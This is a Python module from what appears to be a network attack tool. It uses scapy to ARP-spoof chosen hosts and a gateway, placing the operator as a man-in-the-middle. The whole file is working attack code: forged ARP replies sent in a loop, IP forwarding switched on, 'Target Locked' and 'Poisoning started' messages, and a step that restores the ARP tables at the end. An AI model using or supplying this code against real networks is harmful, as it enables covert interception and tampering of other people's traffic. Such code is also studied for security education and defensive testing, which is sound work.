import time
import scapy.all as scapy
from . import STATUS, STOP_EVENT
from .utils import log_msg, set_ip_forwarding, set_port_forwarding, get_mac

# Helper Functions
def get_own_mac(interface):
    try: 
        return scapy.get_if_hwaddr(interface)
    except: 
        return None

# ARP Spoofing Core Functions
def spoof(target_ip, spoof_ip, target_mac, attacker_mac):
    # Standard Spoofing packet
    packet = scapy.Ether(dst=target_mac, src=attacker_mac) / \
             scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    scapy.sendp(packet, verbose=False, iface=STATUS["interface"])

def restore(dest_ip, source_ip, dest_mac):
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])

# Main Attack Logic
def run_attack_loop(target_ips, gateway_ip, passive=False):
    STATUS["state"] = "RUNNING"
    STATUS["packets"] = 0
    set_ip_forwarding(1)
    
    active_targets = [] 

    try:
        attacker_mac = get_own_mac(STATUS["interface"])
        
        # Check 1: Abort if stop signal is already set
        if STOP_EVENT.is_set(): return

        mitm_mac = get_mac(gateway_ip)
        
        if not mitm_mac:
            log_msg(f"[!] WARNING: Gateway {gateway_ip} is offline.")
            log_msg(f"[*] Switching to ONE-WAY SPOOFING (Target -> Attacker)")
        
        # Resolve MAC addresses for all targets
        log_msg(f"[*] Resolving MAC addresses for {len(target_ips)} targets...")
        
        unique_targets = list(set(target_ips))
        
        for t_ip in unique_targets:
            # Check 2: Abort loop if stop signal is pressed during resolution
            if STOP_EVENT.is_set(): return

            if not t_ip: continue
            t_mac = get_mac(t_ip)
            
            # Retry once if failed
            if not t_mac:
                time.sleep(0.5)
                t_mac = get_mac(t_ip)

            if t_mac:
                active_targets.append({"ip": t_ip, "mac": t_mac})
                log_msg(f"    + Target Locked: {t_ip} [{t_mac}]")
            else:
                log_msg(f"    - Failed to resolve: {t_ip}")

        STATUS["active_targets"] = active_targets

        if not active_targets:
            log_msg("[!] No valid targets found. Stopping.")
            return

        # Check 3: Final check before starting the active loop
        if STOP_EVENT.is_set(): return

        if passive:
            log_msg(f"[*] SILENT MODE: Monitoring {len(active_targets)} hosts")
        else:
            log_msg(f"[*] ATTACK ACTIVE: Poisoning started...")

        # Main Spoofing Loop
        while not STOP_EVENT.is_set():
            if not passive:
                for target in active_targets:
                    try:
                        # 1. Tell Target that I am the Gateway
                        spoof(target["ip"], gateway_ip, target["mac"], attacker_mac)
                        
                        # 2. Tell Gateway that I am the Target
                        if mitm_mac:
                            spoof(gateway_ip, target["ip"], mitm_mac, attacker_mac)
                    except: pass
                
                multiplier = 2 if mitm_mac else 1
                STATUS["packets"] += (len(active_targets) * multiplier)
            
            time.sleep(2)
            
    except Exception as e: log_msg(f"[!] ARP ERROR: {e}")
    finally:
        # cleanup logic
        is_ghost = STOP_EVENT.is_set() and STATUS["packets"] == 0

        if not is_ghost:
            if not passive:
                log_msg("[-] ATTACK STOPPED: Restoring network...")
            else:
                log_msg("[-] STOPPED: Silent Monitor disabled")
            
        for target in active_targets:
            try:
                restore(target["ip"], gateway_ip, target["mac"])
                if mitm_mac: restore(gateway_ip, target["ip"], mitm_mac)
            except: pass
            
        set_ip_forwarding(0)
        set_port_forwarding(False)
        STATUS["state"] = "IDLE"
        STATUS["mode"] = "NONE"